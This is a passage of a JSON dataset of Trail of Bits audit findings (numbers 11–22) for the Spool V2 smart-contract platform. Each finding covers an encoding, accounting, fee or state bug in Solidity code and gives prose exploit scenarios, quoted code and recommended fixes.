guard for it. The guard contract takes only one custom value as an argument. Bob created the guard denition in GuardManager without padding the custom value. Alice tries to deposit into the smart vault, and the guard contract is called for her action. The call to the guard contract fails, and the transaction reverts. The smart vault is unusable. Recommendations Short term, modify the associated code so that it veries that custom values are properly padded before guard denitions are initialized in GuardManager.setGuards . Long term, avoid implementing low-level manipulations. If such implementations are unavoidable, carefully review the Solidity documentation before implementing them to ensure that they are implemented correctly. Additionally, improve the user documentation with necessary technical details to properly use the system.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "11. GuardManager does not account for all possible types when encoding guard arguments ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf",
        "body": "While encoding arguments for guard contracts, the GuardManager contract assumes that all static types are encoded to 32 bytes. This assumption does not hold for xed-size static arrays and structs with only static type members. As a result, guard contracts could receive incorrect arguments, leading to unintended behavior. The GuardManager._encodeFunctionCall function manually encodes arguments to call guard contracts (gure 11.1). function _encodeFunctionCall ( address smartVaultId , GuardDefinition memory guard, RequestContext memory context) internal pure returns ( bytes memory ) { bytes4 methodID = bytes4 ( keccak256 (abi.encodePacked(guard.methodSignature))); uint256 paramsLength = guard.methodParamTypes.length ; bytes memory result = new bytes ( 0 ); result = bytes .concat(result, methodID); uint16 customValueIdx = 0 ; uint256 paramsEndLoc = paramsLength * 32 ; // Loop through parameters and // - store values for simple types // - store param value location for dynamic types for ( uint256 i ; i < paramsLength; ++i) { GuardParamType paramType = guard.methodParamTypes[i]; if (paramType == GuardParamType.DynamicCustomValue) { result = bytes .concat(result, abi.encode( paramsEndLoc )); paramsEndLoc += 32 + guard.methodParamValues[customValueIdx].length; customValueIdx++; } else if (paramType == GuardParamType.CustomValue) { result = bytes .concat(result, guard.methodParamValues[customValueIdx]); customValueIdx++; } [...] } else if (paramType == GuardParamType.Assets) { result = bytes .concat(result, abi.encode( paramsEndLoc )); paramsEndLoc += 32 + context.assets.length * 32 ; } else if (paramType == GuardParamType.Tokens) { result = bytes .concat(result, abi.encode( paramsEndLoc )); paramsEndLoc += 32 + context.tokens.length * 32 ; } else { revert InvalidGuardParamType( uint256 (paramType)); } } [...] return result; } Figure 11.1: The _encodeFunctionCall function in spool-v2-core/GuardManager.sol#L111L177 The function calculates the oset for dynamic type arguments assuming that every parameter, static or dynamic, takes exactly 32 bytes. However, xed-length static type arrays and structs with only static type members are considered static. All static type values are encoded in-place, and static arrays and static structs could take more than 32 bytes. As a result, the calculated oset for the start of dynamic type arguments could be wrong, which would cause incorrect values for these arguments to be set, resulting in unintended behavior. For example, the guard could approve invalid user actions and reject valid user actions or revert every call. Exploit Scenario Bob deploys a smart vault and creates a guard contract that takes the custom value of a xed-length static array type. The guard contract uses RequestContext assets. Bob correctly creates the guard denition in GuardManager , but the GuardManager._encodeFunctionCall function incorrectly encodes the arguments. The guard contract fails to decode the arguments and always reverts the execution. Recommendations Short term, modify the GuardManager._encodeFunctionCall function so that it considers the encoding length of the individual parameters and calculates the osets correctly. Long term, avoid implementing low-level manipulations. If such implementations are unavoidable, carefully review the Solidity documentation before implementing them to ensure that they are implemented correctly.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "12. Use of encoded values in guard contract comparisons could lead to opposite results ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf",
        "body": "The GuardManager contract compares the return value of a guard contract to an expected value. However, the contract uses encoded versions of these values in the comparison, which could lead to incorrect results for signed values with numerical comparison operators. The GuardManager contract calls the guard contract and validates the return value using the GuardManager._checkResult function (gure 12.1). function _checkResult ( bool success , bytes memory returnValue, bytes2 operator, bytes32 value , uint256 guardNum ) internal pure { if (!success) revert GuardError(); bool result = true ; if (operator == bytes2( \"==\" )) { result = abi.decode(returnValue, ( bytes32 )) == value; } else if (operator == bytes2( \"<=\" )) { result = abi.decode(returnValue, ( bytes32 )) <= value; } else if (operator == bytes2( \">=\" )) { result = abi.decode(returnValue, ( bytes32 )) >= value; } else if (operator == bytes2( \"<\" )) { result = abi.decode(returnValue, ( bytes32 )) < value; } else if (operator == bytes2( \">\" )) { result = abi.decode(returnValue, ( bytes32 )) > value; } else { result = abi.decode(returnValue, ( bool )); } if (!result) revert GuardFailed(guardNum); } Figure 12.1: The _checkResult function in spool-v2-core/GuardManager.sol#L80L105 When a smart vault creator denes a guard using the GuardManager.setGuards function, they dene a comparison operator and the expected value, which the GuardManager contract uses to compare with the return value of the guard contract. The comparison is performed on the rst 32 bytes of the ABI-encoded return value and the expected value, which will cause issues depending on the return value type. First, the numerical comparison operators ( < , > , <= , >= ) are not well dened for bytes32 ; therefore, the contract treats encoded values with padding as uint256 values before comparing them. This way of comparing values gives incorrect results for negative values of the int<M> type. The Solidity documentation includes the following description about the encoding of int<M> type values: int<M>: enc(X) is the big-endian twos complement encoding of X, padded on the higher-order (left) side with 0x bytes for negative X and with zero-bytes for non-negative X such that the length is 32 bytes. Figure 12.2: A description about the encoding of int<M> type values in the Solidity documentation Because negative values are padded with 0xff and positive values with 0x00 , the encoded negative values will be considered greater than the encoded positive values. As a result, the result of the comparison will be the opposite of the expected result. Second, only the rst 32 bytes of the return value are considered for comparison. This will lead to inaccurate results for return types that use more than 32 bytes to encode the value. Exploit Scenario Bob deploys a smart vault and intends to allow only users who own B NFTs to use it. B NFTs are implemented using ERC-1155. Bob uses the B contract as a guard with the comparison operator > and an expected value of 0 . Bob calls the function B.balanceOfBatch to fetch the NFT balance of the user. B.balanceOfBatch returns uint256[] . The rst 32 bytes of the return data contain the oset into the return data, which is always nonzero. The comparison passes for every user regardless of whether they own a B NFT. As a result, every user can use Bobs smart vault. Recommendations Short term, restrict the return value of a guard contract to a Boolean value. If that is not possible, document the limitations and risks surrounding the guard contracts. Additionally, consider manually checking new action guards with respect to these limitations. Long term, avoid implementing low-level manipulations. If such implementations are unavoidable, carefully review the Solidity documentation before implementing them to ensure that they are implemented correctly.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "13. Lack of contract existence checks on low-level calls ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf",
        "body": "The GuardManager and Swapper contracts use low-level calls without contract existence checks. If the target address is incorrect or the contract at that address is destroyed, a low-level call will still return success. The Swapper.swap function uses the address().call(...) function to swap tokens (gure 13.1). function swap ( address [] calldata tokensIn, SwapInfo[] calldata swapInfo, address [] calldata tokensOut, address receiver ) external returns ( uint256 [] memory tokenAmounts) { // Perform the swaps. for ( uint256 i ; i < swapInfo.length; ++i) { if (!exchangeAllowlist[swapInfo[i].swapTarget]) { revert ExchangeNotAllowed(swapInfo[i].swapTarget); } _approveMax(IERC20(swapInfo[i].token), swapInfo[i].swapTarget); ( bool success , bytes memory data) = swapInfo[i].swapTarget.call(swapInfo[i].swapCallData); if (!success) revert (SpoolUtils.getRevertMsg(data)); } // Return unswapped tokens. for ( uint256 i ; i < tokensIn.length; ++i) { uint256 tokenInBalance = IERC20(tokensIn[i]).balanceOf( address ( this )); if (tokenInBalance > 0 ) { IERC20(tokensIn[i]).safeTransfer(receiver, tokenInBalance); } } Figure 13.1: The swap function in spool-v2-core/Swapper.sol#L29L45 The Solidity documentation includes the following warning: The low-level functions call, delegatecall and staticcall return true as their rst return value if the account called is non-existent, as part of the design of the EVM. Account existence must be checked prior to calling if needed. Figure 13.2: The Solidity documentation details the necessity of executing existence checks before performing low-level calls. Therefore, if the swapTarget address is incorrect or the target contract has been destroyed, the execution will not revert even if the swap is not successful. We rated this nding as only a low-severity issue because the Swapper contract transfers the unswapped tokens to the receiver if a swap is not successful. However, the CompoundV2Strategy contract uses the Swapper contract to exchange COMP tokens for underlying tokens (gure 13.3). function _compound( address [] calldata tokens, SwapInfo[] calldata swapInfo, uint256 [] calldata ) internal override returns ( int256 compoundedYieldPercentage) { if (swapInfo.length > 0) { address [] memory markets = new address [](1); markets[0] = address (cToken); comptroller.claimComp( address ( this ), markets); uint256 compBalance = comp.balanceOf(address(this)); if (compBalance > 0) { comp.safeTransfer(address(swapper), compBalance); address [] memory tokensIn = new address [](1); tokensIn[0] = address(comp); uint256 swappedAmount = swapper.swap(tokensIn, swapInfo, tokens, address(this))[0]; if ( swappedAmount > 0) { uint256 cTokenBalanceBefore = cToken.balanceOf( address ( this )); _depositToCompoundProtocol (IERC20(tokens[0]), swappedAmount); uint256 cTokenAmountCompounded = cToken.balanceOf( address ( this )) - cTokenBalanceBefore; _calculateYieldPercentage(cTokenBalanceBefore, cTokenAmountCompounded); compoundedYieldPercentage = } } } } Figure 13.3: The _compound function in spool-v2-core/CompoundV2Strategy.sol If the swap operation fails, the COMP will stay in CompoundV2Strategy . This will cause users to lose the yield they would have gotten from compounding. Because the swap operation fails silently, the do hard worker may not notice that yield is not compounding. As a result, users will receive less in prot than they otherwise would have. The GuardManager.runGuards function, which uses the address().staticcall() function, is also aected by this issue. However, the return value of the call is decoded, so the calls would not fail silently. Exploit Scenario The Spool team deploys CompoundV2Strategy with a market that gives COMP tokens to its users. While executing the doHardWork function for smart vaults using CompoundV2Strategy , the do hard worker sets the swapTarget address to an incorrect address. The swap operation to exchange COMP to the underlying token fails silently. The gained yield is not deposited into the market. The users receive less in prot. Recommendations Short term, implement a contract existence check before the low-level calls in GuardManager.runGuards and Swapper.swap . Long term, avoid implementing low-level calls. If such calls are unavoidable, carefully review the Solidity documentation , particularly the Warnings section, before implementing them to ensure that they are implemented correctly.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "14. Incorrect use of exchangeRates in doHardWork ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf",
        "body": "The StrategyRegistry contracts doHardWork function fetches the exchangeRates for all of the tokens involved in the do hard work process, and then it iterates over the strategies and saves the exchangeRates values for the current strategys tokens in the assetGroupExchangeRates variable; however, when doHardWork is called for a strategy, the exchangeRates variable rather than the assetGroupExchangeRates variable is passed, resulting in the use of incorrect exchange rates. function doHardWork(DoHardWorkParameterBag calldata dhwParams) external whenNotPaused { ... // Get exchange rates for tokens and validate them against slippages. uint256 [] memory exchangeRates = SpoolUtils.getExchangeRates(dhwParams.tokens, _priceFeedManager); for ( uint256 i; i < dhwParams.tokens.length; ++i) { if ( exchangeRates[i] < dhwParams.exchangeRateSlippages[i][0] || exchangeRates[i] > dhwParams.exchangeRateSlippages[i][1] revert ExchangeRateOutOfSlippages(); ) { } } ... // Get exchange rates for this group of strategies. uint256 assetGroupId = IStrategy(dhwParams.strategies[i][0]).assetGroupId(); address [] memory assetGroup = IStrategy(dhwParams.strategies[i][0]).assets(); uint256 [] memory assetGroupExchangeRates = new uint256 [](assetGroup.length); for (uint256 j; j < assetGroup.length; ++j) { bool found = false ; for ( uint256 k; k < dhwParams.tokens.length; ++k) { if (assetGroup[j] == dhwParams.tokens[k]) { assetGroupExchangeRates[j] = exchangeRates[k]; found = true ; break ; } } ... // Do the hard work on the strategy. DhwInfo memory dhwInfo = IStrategy(strategy).doHardWork( StrategyDhwParameterBag({ swapInfo: dhwParams.swapInfo[i][j], compoundSwapInfo: dhwParams.compoundSwapInfo[i][j], slippages: dhwParams.strategySlippages[i][j], assetGroup: assetGroup, exchangeRates: exchangeRates , withdrawnShares: _sharesRedeemed[strategy][dhwIndex], masterWallet: address(_masterWallet), priceFeedManager: _priceFeedManager, baseYield: dhwParams.baseYields[i][j], platformFees: platformFeesMemory }) ); // Bookkeeping. _dhwAssetRatios[strategy] = IStrategy(strategy).assetRatio(); _exchangeRates[strategy][dhwIndex].setValues( exchangeRates ); ... Figure 14.1: A snippet of the doHardWork function in spool-v2-core/StrategyRegistry.sol#L222L 341 The exchangeRates values are used by a strategys doHardWork function to calculate how many assets in USD value are to be deposited and how many in USD value are currently deposited in the strategy. As a consequence of using exchangeRates rather than assetGroupExchangeRates , the contract will return incorrect values. Additionally, the _exchangeRates variable is returned by the strategyAtIndexBatch function, which is used when simulating deposits. Exploit Scenario Bob deploys a smart vault, and users start depositing into it. However, the rst time doHardWork is called, they notice that the deposited assets and the reported USD value deposited into the strategies are incorrect. They panic and start withdrawing all of the funds. Recommendations Short term, replace exchangeRates with assetGroupExchangeRates in the relevant areas of doHardWork and where it sets the _exchangeRates variable. Long term, improve the systems unit and integration tests to verify that the deposited value in a strategy is the expected amount. Additionally, when reviewing the code, look for local variables that are set but then never used; this is a warning sign that problems may arise.",
        "labels": [
            "Trail of Bits",
            "Severity: High",
            "Difficulty: Low"
        ]
    },
    {
        "title": "15. LinearAllocationProvider could return an incorrect result ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf",
        "body": "The LinearAllocationProvider contract returns an incorrect result when the given smart vault has a riskTolerance value of -8 due to an incorrect literal value in the riskArray variable. function calculateAllocation(AllocationCalculationInput calldata data) external pure returns ( uint256 [] memory ) { ... uint24 [21] memory riskArray = [ 100000, 95000, 900000 , ... ]; ... uint8 riskt = uint8 (data.riskTolerance + 10); // from 0 to 20 for ( uint8 i; i < data.apys.length; ++i) { ... results[i] = apy * riskArray[ uint8 (20 - riskt)] + risk * riskArray[ uint8 (riskt)] ; resSum += results[i]; } uint256 resSum2; for ( uint8 i; i < results.length; ++i) { results[i] = FULL_PERCENT * results[i] / resSum; resSum2 += results[i]; } results[0] += FULL_PERCENT - resSum2; return results; Figure 15.1: A snippet of the calculateAllocation function in spool-v2-core/LinearAllocationProvider.sol#L9L67 The riskArray s third element is incorrect; this aects the computed allocation for smart vaults that have a riskTolerance value of -8 because the riskt variable would be 2 , which is later used as index for the riskArray . The subexpression risk * riskArray[uint8(rikst)] is incorrect by a factor of 10. Exploit Scenario Bob deploys a smart vault with a riskTolerance value of -8 and an empty strategyAllocation value. The allocation between the strategies is computed on the spot using the LinearAllocationProvider contract, but the allocation is wrong. Recommendations Short term, replace 900000 with 90000 in the calculateAllocation function. Long term, improve the systems unit and integration tests to catch issues such as this. Document the use and meaning of constants such as the values in riskArray . This will make it more likely that the Spool team will nd these types of mistakes.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "16. Incorrect formula used for adding/subtracting two yields ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf",
        "body": "The doHardWork function adds two yields with dierent base values to compute the given strategys total yield, which results in the collection of fewer ecosystem fees and treasury fees. It is incorrect to add two yields that have dierent base values. The correct formula to compute the total yield from two consecutive yields Y1 and Y2 is Y1 + Y2 + (Y1*Y2) . The doHardWork function in the Strategy contract adds the protocol yield and the rewards yield to calculate the given strategys total yield. The protocol yield percentage is calculated with the base value of the strategys total assets at the start of the current do hard work cycle, while the rewards yield percentage is calculated with the base value of the total assets currently owned by the strategy. dhwInfo.yieldPercentage = _getYieldPercentage(dhwParams.baseYield); dhwInfo.yieldPercentage += _compound(dhwParams.assetGroup, dhwParams.compoundSwapInfo, dhwParams.slippages); Figure 16.1: A snippet of the doHardWork function in spool-v2-core/Strategy.sol#L95L96 Therefore, the total yield of the strategy is computed as less than its actual yield, and the use of this value to compute fees results in the collection of fewer fees for the platforms governance system. Same issue also aects the computation of the total yield of a strategy on every do hard work cycle: _stateAtDhw[strategy][dhwIndex] = StateAtDhwIndex({ sharesMinted: uint128 (dhwInfo.sharesMinted), totalStrategyValue: uint128 (dhwInfo.valueAtDhw), totalSSTs: uint128 (dhwInfo.totalSstsAtDhw), yield: int96 (dhwInfo.yieldPercentage) + _stateAtDhw[strategy][dhwIndex - 1].yield, // accumulate the yield from before timestamp: uint32 (block.timestamp) }); Figure 16.2: A snippet of the doHardWork function in spool-v2-core/StrategyRegistry.sol#L331L337 This value of the total yield of a strategy is used to calculate the management fees for a given smart vault, which results in fewer fees paid to the smart vault owner. Exploit Scenario The Spool team deploys the system. Alice deposits 1,000 tokens into a vault, which mints 1,000 strategy share tokens for the vault. On the next do hard work execution, the tokens earn 8% yield and 30 reward tokens from the protocol. The 30 reward tokens are then exchanged for 20 deposit tokens. At this point, the total tokens earned by the strategy are 100 and the total yield is 10%. However, the doHardWork function computes the total yield as 9.85%, which is incorrect, resulting in fewer fees collected for the platform. Recommendations Short term, use the correct formula to calculate a given strategys total yield in both the Strategy contract and the StrategyRegistry contract. Note that the syncDepositsSimulate function subtracts a strategys total yield at dierent do hard work indexes in DepositManager.sol#L322L326 to compute the dierence between the strategys yields between two do hard work cycles. After xing this issue, this functions computation will be incorrect. Long term, review the entire codebase to nd all of the mathematical formulas used. Document these formulas, their assumptions, and their derivations to avoid the use of incorrect formulas.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "17. Smart vaults with re-registered strategies will not be usable ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf",
        "body": "The StrategyRegistry contract does not clear the state related to a strategy when removing it. As a result, if the removed strategy is registered again, the StrategyRegistry contract will still contain the strategys previous state, resulting in a temporary DoS of the smart vaults using it. The StrategyRegistry.registerStrategy function is used to register a strategy and to initialize the state related to it (gure 17.1). StrategyRegistry tracks the state of the strategies by using their address. function registerStrategy ( address strategy ) external { _checkRole(ROLE_SPOOL_ADMIN, msg.sender ); if (_accessControl.hasRole(ROLE_STRATEGY, strategy)) revert StrategyAlreadyRegistered({address_: strategy}); _accessControl.grantRole(ROLE_STRATEGY, strategy); _currentIndexes[strategy] = 1 ; _dhwAssetRatios[strategy] = IStrategy(strategy).assetRatio(); _stateAtDhw[ address (strategy)][ 0 ].timestamp = uint32 ( block.timestamp ); } Figure 17.1: The registerStrategy function in spool-v2-core/StrategyRegistry.sol The StrategyRegistry._removeStrategy function is used to remove a strategy by revoking its ROLE_STRATEGY role. function _removeStrategy ( address strategy ) private { if (!_accessControl.hasRole(ROLE_STRATEGY, strategy)) revert InvalidStrategy({address_: strategy}); _accessControl.revokeRole(ROLE_STRATEGY, strategy); } Figure 17.2: The _removeStrategy function in spool-v2-core/StrategyRegistry.sol While removing a strategy, StrategyRegistry contract does not remove the state related to that strategy. As a result, when that strategy is registered again, StrategyRegistry will contain values from the previous period. This could make the smart vaults using the strategy unusable or cause the unintended transfer of assets between other strategies and this strategy. Exploit Scenario Strategy S is registered. StrategyRegistry._currentIndex[S] is equal to 1 . Alice creates a smart vault X that uses strategy S. Bob deposits 1 million WETH into smart vault X. StrategyRegistry._assetsDeposited[S][1][WETH] is equal to 1 million WETH. The doHardWork function is called for strategy S. WETH is transferred from the master wallet to strategy S and is deposited into the protocol. A Spool system admin removes strategy S upon hearing that the protocol is being exploited. However, the admin realizes that the protocol is not being exploited and re-registers strategy S. StrategyRegistry._currentIndex[S] is set to 1 . StrategyRegistry._assetsDeposited[S][1][WETH] is not set to zero and is still equal to 1 million WETH. Alice creates a new vault with strategy S. When doHardWork is called for strategy S, StrategyRegistry tries to transfer 1 million WETH to the strategy. The master wallet does not have those assets, so doHardWork fails for strategy S. The smart vault becomes unusable. Recommendations Short term, modify the StrategyRegistry._removeStrategy function so that it clears states related to removed strategies if re-registering strategies is an intended use case. If this is not an intended use case, modify the StrategyRegistry.registerStrategy function so that it veries that newly registered strategies have not been previously registered. Long term, properly document all intended use cases of the system and implement comprehensive tests to ensure that the system behaves as expected.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: High"
        ]
    },
    {
        "title": "18. Incorrect handling of partially burned NFTs results in incorrect SVT balance calculation ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf",
        "body": "The SmartVault._afterTokenTransfer function removes the given NFT ID from the SmartVault._activeUserNFTIds array even if only a fraction of it is burned. As a result, the SmartVaultManager.getUserSVTBalance function, which uses SmartVault._activeUserNFTIds , will show less than the given users actual balance. SmartVault._afterTokenTransfer is executed after every token transfer (gure 18.1). function _afterTokenTransfer ( address , address from , address to , uint256 [] memory ids, uint256 [] memory , bytes memory ) internal override { // burn if (to == address ( 0 )) { uint256 count = _activeUserNFTCount[from]; for ( uint256 i ; i < ids.length; ++i) { for ( uint256 j = 0 ; j < count; j++) { if (_activeUserNFTIds[from][j] == ids[i]) { _activeUserNFTIds[from][j] = _activeUserNFTIds[from][count - 1 ]; count--; break ; } } } _activeUserNFTCount[from] = count; return ; } [...] } Figure 18.1: A snippet of the _afterTokenTransfer function in spool-v2-core/SmartVault.sol It removes the burned NFT from _activeUserNFTIds . However, it does not consider the amount of the NFT that was burned. As a result, NFTs that are not completely burned will not be considered active by the vault. SmartVaultManager.getUserSVTBalance uses SmartVault._activeUserNFTIds to calculate a given users SVT balance (gure 18.2). function getUserSVTBalance ( address smartVaultAddress , address userAddress ) external view returns ( uint256 ) { if (_accessControl.smartVaultOwner(smartVaultAddress) == userAddress) { (, uint256 ownerSVTs ,, uint256 fees ) = _simulateSync(smartVaultAddress); return ownerSVTs + fees; } uint256 currentBalance = ISmartVault(smartVaultAddress).balanceOf(userAddress); uint256 [] memory nftIds = ISmartVault(smartVaultAddress).activeUserNFTIds(userAddress); if (nftIds.length > 0 ) { currentBalance += _simulateNFTBurn(smartVaultAddress, userAddress, nftIds); } return currentBalance; } Figure 18.2: The getUserSVTBalance function in spool-v2-core/SmartVaultManager.sol Because partial NFTs are not present in SmartVault._activeUserNFTIds , the calculated balance will be less than the users actual balance. The front end using getUserSVTBalance will show incorrect balances to users. Exploit Scenario Alice deposits assets into a smart vault and receives a D-NFT. Alice's assets are deposited to the protocols after doHardWork is called. Alice claims SVTs by burning a fraction of her D-NFT. The smart vault removes the D-NFT from _activeUserNFTIds . Alice checks her SVT balance and panics when she sees less than what she expected. She withdraws all of her assets from the system. Recommendations Short term, add a check to the _afterTokenTransfer function so that it checks the balance of the NFT that is burned and removes the NFT from _activeUserNFTIds only when the NFT is burned completely. Long term, improve the systems unit and integration tests to extensively test view functions.",
        "labels": [
            "Trail of Bits",
            "Severity: Low",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "19. Transfers of D-NFTs result in double counting of SVT balance ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf",
        "body": "The _activeUserNFTIds and _activeUserNFTCount variables are not updated for the sender account on the transfer of NFTs. As a result, SVTs for transferred NFTs will be counted twice, causing the system to show an incorrect SVT balance. The _afterTokenTransfer hook in the SmartVault contract is executed after every token transfer to update information about users active NFTs: function _afterTokenTransfer ( address , address from , address to , uint256 [] memory ids, uint256 [] memory , bytes memory ) internal override { // burn if (to == address ( 0 )) { ... return ; } // mint or transfer for ( uint256 i; i < ids.length; ++i) { _activeUserNFTIds[to][_activeUserNFTCount[to]] = ids[i]; _activeUserNFTCount[to]++; } } Figure 19.1: A snippet of the _afterTokenTransfer function in spool-v2-core/SmartVault.sol When a user transfers an NFT to another user, the function adds the NFT ID to the active NFT IDs of the receivers account but does not remove the ID from the active NFT IDs of the senders account. Additionally, the active NFT count is not updated for the senders account. The getUserSVTBalance function of the SmartVaultManager contract uses the SmartVault contracts _activeUserNFTIds array to calculate a given users SVT balance: function getUserSVTBalance ( address smartVaultAddress , address userAddress ) external view returns ( uint256 ) { if (_accessControl.smartVaultOwner(smartVaultAddress) == userAddress) { (, uint256 ownerSVTs ,, uint256 fees ) = _simulateSync(smartVaultAddress); return ownerSVTs + fees; } uint256 currentBalance = ISmartVault(smartVaultAddress).balanceOf(userAddress); uint256 [] memory nftIds = ISmartVault(smartVaultAddress).activeUserNFTIds(userAddress); if (nftIds.length > 0 ) { currentBalance += _simulateNFTBurn(smartVaultAddress, userAddress, nftIds); } return currentBalance; } Figure 19.2: The getUserSVTBalance function in spool-v2-core/SmartVaultManager.sol Because transferred NFT IDs are active for both senders and receivers, the SVTs corresponding to the NFT IDs will be counted for both users. This double counting will keep increasing the SVT balance for users with every transfer, causing an incorrect balance to be shown to users and third-party integrators. Exploit Scenario Alice deposits assets into a smart vault and receives a D-NFT. Alice's assets are deposited into the protocols after doHardWork is called. Alice transfers the D-NFT to herself. The SmartVault contract adds the D-NFT ID to _activeUserNFTIds for Alice again. Alice checks her SVT balance and sees double the balance she had before. Recommendations Short term, modify the _afterTokenTransfer function so that it removes NFT IDs from the active NFT IDs for the senders account when users transfer D-NFTs and W-NFTs. Long term, add unit test cases for all possible user interactions to catch issues such as this.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "20. Flawed loop for syncing ushes results in higher management fees ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf",
        "body": "The loop used to sync ush indexes in the SmartVaultManager contract computes an inated value of the oldTotalSVTs variable, which results in higher management fees paid to the smart vault owner. The _syncSmartVault function in the SmartVaultManager contract implements a loop to process every ush index from flushIndex.toSync to flushIndex.current : while (flushIndex.toSync < flushIndex.current) { ... DepositSyncResult memory syncResult = _depositManager.syncDeposits( smartVault, [flushIndex.toSync, bag.lastDhwSynced, bag.oldTotalSVTs], strategies_, [indexes, _getPreviousDhwIndexes(smartVault, flushIndex.toSync)], tokens, bag.fees ); bag.newSVTs += syncResult.mintedSVTs; bag.feeSVTs += syncResult.feeSVTs; bag.oldTotalSVTs += bag.newSVTs; bag.lastDhwSynced = syncResult.dhwTimestamp; emit SmartVaultSynced(smartVault, flushIndex.toSync); flushIndex.toSync++; } Figure 20.1: A snippet of the _syncSmartVault function in spool-v2-core/SmartVaultManager.sol This loop adds the value of mintedSVTs to the newSVTs variables and then computes the value of oldTotalSVTs by adding newSVTs to it in every iteration. Because mintedSVTs are added in every iteration, new minted SVTs are added for each ush index multiple times when the loop is iterated more than once. The value of oldTotalSVTs is then passed to the syncDeposit function of the DepositManager contract, which uses it to compute the management fee for the smart vault. The use of the inated value of oldTotalSVTs causes higher management fees to be paid to the smart vault owner. Exploit Scenario Alice deposits assets into a smart vault and ushes it. Before doHardWork is executed, Bob deposits assets into the same smart vault and ushes it. At this point, flushIndex.current has been increased twice for the smart vault. After the execution of doHardWork , the loop to sync the smart vault is iterated twice. As a result, a double management fee is paid to the smart vault owner, and Alice and Bob lose assets. Recommendations Short term, modify the loop so that syncResult.mintedSVTs is added to bag.oldTotalSVTs instead of bag.newSVTs . Long term, be careful when implementing accumulators in loops. Add test cases for multiple interactions to catch such issues.",
        "labels": [
            "Trail of Bits",
            "Severity: Medium",
            "Difficulty: Low"
        ]
    },
    {
        "title": "21. Incorrect ghost strategy check ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf",
        "body": "The emergencyWithdraw and redeemStrategyShares functions incorrectly check whether a strategy is a ghost strategy after checking that the strategy has a ROLE_STRATEGY role. function emergencyWithdraw( address [] calldata strategies, uint256 [][] calldata withdrawalSlippages, bool removeStrategies ) external onlyRole(ROLE_EMERGENCY_WITHDRAWAL_EXECUTOR, msg.sender ) { for ( uint256 i; i < strategies.length; ++i) { _checkRole(ROLE_STRATEGY, strategies[i]); if (strategies[i] == _ghostStrategy) { continue ; } [...] Figure 21.1: A snippet the emergencyWithdraw function spool-v2-core/StrategyRegistry.sol#L456L465 function redeemStrategyShares( address [] calldata strategies, uint256 [] calldata shares, uint256 [][] calldata withdrawalSlippages ) external { for ( uint256 i; i < strategies.length; ++i) { _checkRole(ROLE_STRATEGY, strategies[i]); if (strategies[i] == _ghostStrategy) { continue ; } [...] Figure 21.2: A snippet the emergencyWithdraw function spool-v2-core/StrategyRegistry.sol#L477L486 A ghost strategy will never have the ROLE_STRATEGY role, so both functions will always incorrectly revert if a ghost strategy is passed in the strategies array. Exploit Scenario Bob calls redeemStrategyShares with the ghost strategy in strategies and the transaction unexpectedly reverts. Recommendations Short term, modify the aected functions so that they verify whether the given strategy is a ghost strategy before checking the role with _checkRole . Long term, clearly document which roles a contract should have and implement the appropriate checks to verify them.",
        "labels": [
            "Trail of Bits",
            "Severity: Informational",
            "Difficulty: Medium"
        ]
    },
    {
        "title": "22. Reward conguration not initialized properly when reward is zero ",
        "html_url": "https://github.com/trailofbits/publications/tree/master/reviews/2023-03-spool-platformv2-securityreview.pdf",
        "body": "The RewardManager.addToken function, which adds a new reward token for the given smart vault, does not initialize all conguration variables when the initial reward is zero. As a result, all calls to the RewardManager.extendRewardEmission function will fail, and rewards cannot be added for that vault. RewardManager.addToken adds a new reward token for the given smart vault. The reward tokens for a smart vault are tracked using the RewardManager.rewardConfiguration function. The tokenAdded value of the conguration is used to check whether the token has already been added for the vault (gure 22.1). function addToken ( address smartVault , IERC20 token, uint32 rewardsDuration , uint256 reward ) external onlyAdminOrVaultAdmin(smartVault, msg.sender ) exceptUnderlying(smartVault, token) { RewardConfiguration storage config = rewardConfiguration [smartVault][token]; if (tokenBlacklist[smartVault][token]) revert RewardTokenBlacklisted( address (token)); if ( config.tokenAdded != 0 ) revert RewardTokenAlreadyAdded( address (token)); if (rewardsDuration == 0 ) revert InvalidRewardDuration(); if (rewardTokensCount[smartVault] > 5 ) revert RewardTokenCapReached(); rewardTokens[smartVault][rewardTokensCount[smartVault]] = token; rewardTokensCount[smartVault]++; config.rewardsDuration = rewardsDuration; if ( reward > 0 ) { _extendRewardEmission(smartVault, token, reward); } } Figure 22.1: The addToken function in spool-v2-core/RewardManager.sol#L81L101 However, RewardManager.addToken does not update config.tokenAdded , and the _extendRewardEmission function, which updates config.tokenAdded , is called only when the reward is greater than zero. RewardManager.extendRewardEmission is the only entry point to add rewards for a vault. It checks whether token has been previously added by verifying that tokenAdded 